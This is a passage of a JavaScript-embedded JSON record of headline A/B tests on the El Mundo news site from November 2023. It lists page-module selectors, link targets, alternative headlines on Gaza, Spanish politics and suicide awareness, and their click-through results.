              "selector": "[data-b-name=\"reports_prime_c\"]",
              "name": "reports_prime_c"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_b\"]",
              "name": "ad_reports_b_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_e\"]",
              "name": "reports_prime_e"
            }, {
              "selector": "[data-b-name=\"row_botones\"]",
              "name": "row_botones"
            }, {
              "name": "Links Párrafos",
              "selector": ".ue-l-article__body p"
            }, {
              "name": "Noticias relacionadas final",
              "selector": ".ue-c-article__related-news"
            }, {
              "name": "BT Noticias",
              "selector": ".ue-c-cover-content--is-bt-module"
            }, {
              "name": "Taboola in body",
              "selector": ".ue-c-article__taboola-in-body"
            }, {
              "name": "Taboola Below Article Thumbnails",
              "selector": "[data-placement-name='Below Article Thumbnails']"
            }, {
              "name": "Tags artículos",
              "selector": ".ue-c-article__tags"
            }, {
              "name": "Autor",
              "selector": ".ue-c-article__byline"
            }, {
              "name": "Contenido Relacionado",
              "selector": ".ue-c-article__subtitles"
            }],
            "blacklist": [{
              "selector": "[href*='/autor/']"
            }],
            "redirectionLinks": []
          }
        }
      },
      "variants": [{
        "id": "452db03e-8c1c-4d97-b5dd-2c578b6c58d8",
        "strategy": {
          "type": "percent",
          "value": 0.5
        },
        "detail": {
          "replacements": {}
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 4247,
          "clicks": 8,
          "ctr": 0.0018836826
        }
      }, {
        "id": "5ac2cefb-6e8f-44f7-8dfd-1dbad2ebfc37",
        "strategy": {
          "type": "percent",
          "value": 0.5
        },
        "detail": {
          "replacements": {
            "title": {
              "text": "<span class=\"ue-c-cover-content__related-link-kicker\">\nDirecto.\n</span>Hamas: La UCI pediátrica de Al Shifa deja de funcionar y muere un bebé"
            }
          }
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 4364,
          "clicks": 7,
          "ctr": 0.001604033
        }
      }],
      "applyChangesOnFinish": true
    }, {
      "id": "654f3788cc3cea67e1f7fdc7",
      "createdDate": "2023-11-11T08:12:56.344Z",
      "lastModifiedDate": "2023-11-11T08:44:10.954Z",
      "experimentType": "HeadlineAB",
      "siteId": 2298,
      "experienceId": "AC_r0jYFWSkRnqQC8EIkzviDA",
      "status": "FINISHED",
      "endTime": "2023-11-11T08:44:10.953Z",
      "detail": {
        "target": {
          "anchor": {
            "href": "https://www.elmundo.es/internacional/2023/11/11/654f1b992dd8a80028823b20-directo.html",
            "xpath": "/html/body/main/div[9]/div/div/div/div/div[2]/div[2]/div/article/div[2]/ul/li/a",
            "text": "<span class=\"ue-c-cover-content__related-link-kicker\">\nDirecto.\n</span>La OMS denuncia 250 ataques israelíes a hospitales o ambulancias"
          }
        },
        "recirculationModule": {
          "name": "reports_prime",
          "index": 2,
          "editorialId": "489537499",
          "config": {
            "lazy": true,
            "layouts": [],
            "modules": [{
              "selector": "[data-b-name=\"headlines_a\"]",
              "name": "headlines_a"
            }, {
              "selector": "[data-b-name=\"ad_news_a\"]",
              "name": "ad_news_a"
            }, {
              "selector": "[data-b-name=\"flex_oro\"]",
              "name": "flex_oro"
            }, {
              "selector": "[data-b-name=\"reports_prime\"]",
              "name": "reports_prime"
            }, {
              "selector": "[data-b-name=\"ad_news_a_destacados\"]",
              "name": "ad_news_a_destacados"
            }, {
              "selector": "[data-b-name=\"opinion\"]",
              "name": "opinion"
            }, {
              "selector": "[data-b-name=\"mega_b\"]",
              "name": "mega_b"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_2\"]",
              "name": "ad_reports_b_2"
            }, {
              "selector": "[data-b-name=\"ad_reports_other\"]",
              "name": "ad_reports_other"
            }, {
              "selector": "[data-b-name=\"reports_prime_b\"]",
              "name": "reports_prime_b"
            }, {
              "selector": "[data-b-name=\"flex_oro_b\"]",
              "name": "flex_oro_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_c\"]",
              "name": "reports_prime_c"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_b\"]",
              "name": "ad_reports_b_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_e\"]",
              "name": "reports_prime_e"
            }, {
              "selector": "[data-b-name=\"row_botones\"]",
              "name": "row_botones"
            }, {
              "selector": "[data-b-name=\"headlines_a\"]",
              "name": "headlines_a"
            }, {
              "selector": "[data-b-name=\"ad_news_a\"]",
              "name": "ad_news_a"
            }, {
              "selector": "[data-b-name=\"flex_oro\"]",
              "name": "flex_oro"
            }, {
              "selector": "[data-b-name=\"reports_prime\"]",
              "name": "reports_prime"
            }, {
              "selector": "[data-b-name=\"ad_news_a_destacados\"]",
              "name": "ad_news_a_destacados"
            }, {
              "selector": "[data-b-name=\"opinion\"]",
              "name": "opinion"
            }, {
              "selector": "[data-b-name=\"mega_b\"]",
              "name": "mega_b"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_2\"]",
              "name": "ad_reports_b_2"
            }, {
              "selector": "[data-b-name=\"ad_reports_other\"]",
              "name": "ad_reports_other"
            }, {
              "selector": "[data-b-name=\"reports_prime_b\"]",
              "name": "reports_prime_b"
            }, {
              "selector": "[data-b-name=\"flex_oro_b\"]",
              "name": "flex_oro_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_c\"]",
              "name": "reports_prime_c"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_b\"]",
              "name": "ad_reports_b_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_e\"]",
              "name": "reports_prime_e"
            }, {
              "selector": "[data-b-name=\"row_botones\"]",
              "name": "row_botones"
            }, {
              "name": "Links Párrafos",
              "selector": ".ue-l-article__body p"
            }, {
              "name": "Noticias relacionadas final",
              "selector": ".ue-c-article__related-news"
            }, {
              "name": "BT Noticias",
              "selector": ".ue-c-cover-content--is-bt-module"
            }, {
              "name": "Taboola in body",
              "selector": ".ue-c-article__taboola-in-body"
            }, {
              "name": "Taboola Below Article Thumbnails",
              "selector": "[data-placement-name='Below Article Thumbnails']"
            }, {
              "name": "Tags artículos",
              "selector": ".ue-c-article__tags"
            }, {
              "name": "Autor",
              "selector": ".ue-c-article__byline"
            }, {
              "name": "Contenido Relacionado",
              "selector": ".ue-c-article__subtitles"
            }],
            "blacklist": [{
              "selector": "[href*='/autor/']"
            }],
            "redirectionLinks": []
          }
        }
      },
      "variants": [{
        "id": "b2f23c3a-1b9b-4352-bc9b-8f6477ee9e85",
        "strategy": {
          "type": "percent",
          "value": 0.5
        },
        "detail": {
          "replacements": {}
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 16705,
          "clicks": 18,
          "ctr": 0.0010775217
        }
      }, {
        "id": "ec1236e8-3b89-4f1a-afc7-ab89241c886d",
        "strategy": {
          "type": "percent",
          "value": 0.5
        },
        "detail": {
          "replacements": {
            "title": {
              "text": "<span class=\"ue-c-cover-content__related-link-kicker\">\nDirecto.\n</span>El director de la OMS: \"Cada diez minutos muere un niño en Gaza\""
            }
          }
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 16897,
          "clicks": 22,
          "ctr": 0.0013020063
        }
      }],
      "applyChangesOnFinish": true
    }, {
      "id": "654f3fb638afcb11d0b60d3c",
      "createdDate": "2023-11-11T08:47:50.358Z",
      "lastModifiedDate": "2023-11-11T09:19:10.969Z",
      "experimentType": "HeadlineAB",
      "siteId": 2298,
      "experienceId": "AC_r0jYFWSkRnqQC8EIkzviDA",
      "status": "FINISHED",
      "endTime": "2023-11-11T09:19:10.969Z",
      "detail": {
        "target": {
          "anchor": {
            "href": "https://www.elmundo.es/opinion/luces-para-la-constitucion/2023/11/10/654e9c1fe85ece7c108b45b5.html",
            "xpath": "/html/body/main/div[6]/div/div/div/div/div[2]/div[2]/div[3]/article/div/div[2]/header/a",
            "text": "Manuel Valls: \"La amnistía es una condena de la democracia y un espectáculo ante Europa\"",
            "textSelector": "h2:nth-of-type(1)"
          },
          "image": {
            "xpath": "/html/body/main/div[6]/div/div/div/div/div[2]/div[2]/div[3]/article/div/div[1]/figure/div/picture/img",
            "src": "https://e00-elmundo.uecdn.es/assets/multimedia/imagenes/2023/11/11/16996659192568.jpg"
          }
        },
        "recirculationModule": {
          "name": "headlines_a",
          "index": 7,
          "editorialId": "489298073",
          "config": {
            "lazy": true,
            "layouts": [],
            "modules": [{
              "selector": "[data-b-name=\"headlines_a\"]",
              "name": "headlines_a"
            }, {
              "selector": "[data-b-name=\"ad_news_a\"]",
              "name": "ad_news_a"
            }, {
              "selector": "[data-b-name=\"flex_oro\"]",
              "name": "flex_oro"
            }, {
              "selector": "[data-b-name=\"reports_prime\"]",
              "name": "reports_prime"
            }, {
              "selector": "[data-b-name=\"ad_news_a_destacados\"]",
              "name": "ad_news_a_destacados"
            }, {
              "selector": "[data-b-name=\"opinion\"]",
              "name": "opinion"
            }, {
              "selector": "[data-b-name=\"mega_b\"]",
              "name": "mega_b"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_2\"]",
              "name": "ad_reports_b_2"
            }, {
              "selector": "[data-b-name=\"ad_reports_other\"]",
              "name": "ad_reports_other"
            }, {
              "selector": "[data-b-name=\"reports_prime_b\"]",
              "name": "reports_prime_b"
            }, {
              "selector": "[data-b-name=\"flex_oro_b\"]",
              "name": "flex_oro_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_c\"]",
              "name": "reports_prime_c"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_b\"]",
              "name": "ad_reports_b_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_e\"]",
              "name": "reports_prime_e"
            }, {
              "selector": "[data-b-name=\"row_botones\"]",
              "name": "row_botones"
            }, {
              "selector": "[data-b-name=\"headlines_a\"]",
              "name": "headlines_a"
            }, {
              "selector": "[data-b-name=\"ad_news_a\"]",
              "name": "ad_news_a"
            }, {
              "selector": "[data-b-name=\"flex_oro\"]",
              "name": "flex_oro"
            }, {
              "selector": "[data-b-name=\"reports_prime\"]",
              "name": "reports_prime"
            }, {
              "selector": "[data-b-name=\"ad_news_a_destacados\"]",
              "name": "ad_news_a_destacados"
            }, {
              "selector": "[data-b-name=\"opinion\"]",
              "name": "opinion"
            }, {
              "selector": "[data-b-name=\"mega_b\"]",
              "name": "mega_b"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_2\"]",
              "name": "ad_reports_b_2"
            }, {
              "selector": "[data-b-name=\"ad_reports_other\"]",
              "name": "ad_reports_other"
            }, {
              "selector": "[data-b-name=\"reports_prime_b\"]",
              "name": "reports_prime_b"
            }, {
              "selector": "[data-b-name=\"flex_oro_b\"]",
              "name": "flex_oro_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_c\"]",
              "name": "reports_prime_c"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_b\"]",
              "name": "ad_reports_b_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_e\"]",
              "name": "reports_prime_e"
            }, {
              "selector": "[data-b-name=\"row_botones\"]",
              "name": "row_botones"
            }, {
              "name": "Links Párrafos",
              "selector": ".ue-l-article__body p"
            }, {
              "name": "Noticias relacionadas final",
              "selector": ".ue-c-article__related-news"
            }, {
              "name": "BT Noticias",
              "selector": ".ue-c-cover-content--is-bt-module"
            }, {
              "name": "Taboola in body",
              "selector": ".ue-c-article__taboola-in-body"
            }, {
              "name": "Taboola Below Article Thumbnails",
              "selector": "[data-placement-name='Below Article Thumbnails']"
            }, {
              "name": "Tags artículos",
              "selector": ".ue-c-article__tags"
            }, {
              "name": "Autor",
              "selector": ".ue-c-article__byline"
            }, {
              "name": "Contenido Relacionado",
              "selector": ".ue-c-article__subtitles"
            }],
            "blacklist": [{
              "selector": "[href*='/autor/']"
            }],
            "redirectionLinks": []
          }
        }
      },
      "variants": [{
        "id": "946f7ee9-cab6-4c89-b3c8-77f09bc96ea6",
        "strategy": {
          "type": "percent",
          "value": 0.3333333432674408
        },
        "detail": {
          "replacements": {}
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 17025,
          "clicks": 164,
          "ctr": 0.009632893
        }
      }, {
        "id": "4ea17a05-73eb-4db8-bef0-f7928b9d1f19",
        "strategy": {
          "type": "percent",
          "value": 0.3333333432674408
        },
        "detail": {
          "replacements": {
            "title": {
              "text": "Manuel Valls: \n\"Dividir España, abrir la posibilidad de que un día sus regiones se separen, es muy peligroso también para Europa\"\n"
            }
          }
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 16897,
          "clicks": 157,
          "ctr": 0.00929159
        }
      }, {
        "id": "b7cb853c-e5dd-43af-a54f-f031bc24be75",
        "strategy": {
          "type": "percent",
          "value": 0.3333333432674408
        },
        "detail": {
          "replacements": {
            "title": {
              "text": "Manuel Valls: \n\"España Tiene una gran capacidad de resistencia.  La Transición fue un ejemplo para el mundo\"\n\n"
            }
          }
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 17039,
          "clicks": 143,
          "ctr": 0.008392511
        }
      }],
      "applyChangesOnFinish": true
    }, {
      "id": "654f43ef38afcb11d0b60d3e",
      "createdDate": "2023-11-11T09:05:51.780Z",
      "lastModifiedDate": "2023-11-11T09:25:10.961Z",
      "experimentType": "HeadlineAB",
      "siteId": 2298,
      "experienceId": "AC_r0jYFWSkRnqQC8EIkzviDA",
      "status": "FINISHED",
      "endTime": "2023-11-11T09:25:10.961Z",
      "detail": {
        "target": {
          "anchor": {
            "href": "https://www.elmundo.es/ciencia-y-salud/salud/2023/11/11/64dbe0a2e85ece5f278b45aa.html",
            "xpath": "/html/body/main/div[10]/div/div/div/div/div[2]/div[1]/div[1]/div[2]/article/div[1]/div[2]/header/a",
            "text": "Nuestros lectores, voces cargadas de esperanza: \"Busquen ayuda, no se queden solos con su dolor\"",
            "textSelector": "h2:nth-of-type(1)"
          },
          "image": {
            "xpath": "/html/body/main/div[10]/div/div/div/div/div[2]/div[1]/div[1]/div[2]/article/div[1]/div[1]/figure/div/picture/img",
            "src": "https://e00-elmundo.uecdn.es/assets/multimedia/imagenes/2023/08/15/16921327434125.jpg"
          }
        },
        "recirculationModule": {
          "name": "ad_news_a_destacados",
          "index": 1,
          "editorialId": "489423842",
          "config": {
            "lazy": true,
            "layouts": [],
            "modules": [{
              "selector": "[data-b-name=\"headlines_a\"]",
              "name": "headlines_a"
            }, {
              "selector": "[data-b-name=\"ad_news_a\"]",
              "name": "ad_news_a"
            }, {
              "selector": "[data-b-name=\"flex_oro\"]",
              "name": "flex_oro"
            }, {
              "selector": "[data-b-name=\"reports_prime\"]",
              "name": "reports_prime"
            }, {
              "selector": "[data-b-name=\"ad_news_a_destacados\"]",
              "name": "ad_news_a_destacados"
            }, {
              "selector": "[data-b-name=\"opinion\"]",
              "name": "opinion"
            }, {
              "selector": "[data-b-name=\"mega_b\"]",
              "name": "mega_b"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_2\"]",
              "name": "ad_reports_b_2"
            }, {
              "selector": "[data-b-name=\"ad_reports_other\"]",
              "name": "ad_reports_other"
            }, {
              "selector": "[data-b-name=\"reports_prime_b\"]",
              "name": "reports_prime_b"
            }, {
              "selector": "[data-b-name=\"flex_oro_b\"]",
              "name": "flex_oro_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_c\"]",
              "name": "reports_prime_c"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_b\"]",
              "name": "ad_reports_b_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_e\"]",
              "name": "reports_prime_e"
            }, {
              "selector": "[data-b-name=\"row_botones\"]",
              "name": "row_botones"
            }, {
              "selector": "[data-b-name=\"headlines_a\"]",
              "name": "headlines_a"
            }, {
              "selector": "[data-b-name=\"ad_news_a\"]",
              "name": "ad_news_a"
            }, {
              "selector": "[data-b-name=\"flex_oro\"]",
              "name": "flex_oro"
            }, {
              "selector": "[data-b-name=\"reports_prime\"]",
              "name": "reports_prime"
            }, {
              "selector": "[data-b-name=\"ad_news_a_destacados\"]",
              "name": "ad_news_a_destacados"
            }, {
              "selector": "[data-b-name=\"opinion\"]",
              "name": "opinion"
            }, {
              "selector": "[data-b-name=\"mega_b\"]",
              "name": "mega_b"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_2\"]",
              "name": "ad_reports_b_2"
            }, {
              "selector": "[data-b-name=\"ad_reports_other\"]",
              "name": "ad_reports_other"
            }, {
              "selector": "[data-b-name=\"reports_prime_b\"]",
              "name": "reports_prime_b"
            }, {
              "selector": "[data-b-name=\"flex_oro_b\"]",
              "name": "flex_oro_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_c\"]",
              "name": "reports_prime_c"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_b\"]",
              "name": "ad_reports_b_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_e\"]",
              "name": "reports_prime_e"
            }, {
              "selector": "[data-b-name=\"row_botones\"]",
              "name": "row_botones"
            }, {
              "name": "Links Párrafos",
              "selector": ".ue-l-article__body p"
            }, {
              "name": "Noticias relacionadas final",
              "selector": ".ue-c-article__related-news"
            }, {
              "name": "BT Noticias",
              "selector": ".ue-c-cover-content--is-bt-module"
            }, {
              "name": "Taboola in body",
              "selector": ".ue-c-article__taboola-in-body"
            }, {
              "name": "Taboola Below Article Thumbnails",
              "selector": "[data-placement-name='Below Article Thumbnails']"
            }, {
              "name": "Tags artículos",
              "selector": ".ue-c-article__tags"
            }, {
              "name": "Autor",
              "selector": ".ue-c-article__byline"
            }, {
              "name": "Contenido Relacionado",
              "selector": ".ue-c-article__subtitles"
            }],
            "blacklist": [{
              "selector": "[href*='/autor/']"
            }],
            "redirectionLinks": []
          }
        }
      },
      "variants": [{
        "id": "b04adfbe-2546-4c72-9a59-dfb42644a910",
        "strategy": {
          "type": "percent",
          "value": 0.25
        },
        "detail": {
          "replacements": {}
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 4048,
          "clicks": 6,
          "ctr": 0.0014822134
        }
      }, {
        "id": "fc4e389a-b267-4d5c-afbd-f0c4e1d46acc",
        "strategy": {
          "type": "percent",
          "value": 0.25
        },
        "detail": {
          "replacements": {
            "title": {
              "text": "Nuestros lectores, voces cargadas de esperanza: \"El suicidio es el elefante en la sala del que nadie habla\"\n"
            }
          }
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 3930,
          "clicks": 12,
          "ctr": 0.0030534351
        }
      }, {
        "id": "6c009f66-e38c-46de-a9b5-9a6bde5ed987",
        "strategy": {
          "type": "percent",
          "value": 0.25
        },
        "detail": {
          "replacements": {
            "title": {
              "text": "Nuestros lectores, voces cargadas de esperanza: \n\"Once personas al día!... son muchas como para no analizar qué  está pasando\""
            }
          }
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 3889,
          "clicks": 12,
          "ctr": 0.003085626
        }
      }, {
        "id": "e8851403-b815-4358-a058-75ffb8979416",
        "strategy": {
          "type": "percent",
          "value": 0.25
        },
        "detail": {
          "replacements": {
            "title": {
              "text": "Nuestros lectores, voces cargadas de esperanza: \n\n\"Mucho hay que invertir para estudiar qué nos está pasando como sociedad\""
            }
          }
        },
        "result": {
          "type": "HeadlineAB",
          "impressions": 3909,
          "clicks": 13,
          "ctr": 0.0033256589
        }
      }],
      "winner": "e8851403-b815-4358-a058-75ffb8979416",
      "applyChangesOnFinish": true
    }]);
  } catch (r) {
    E();
  }
}();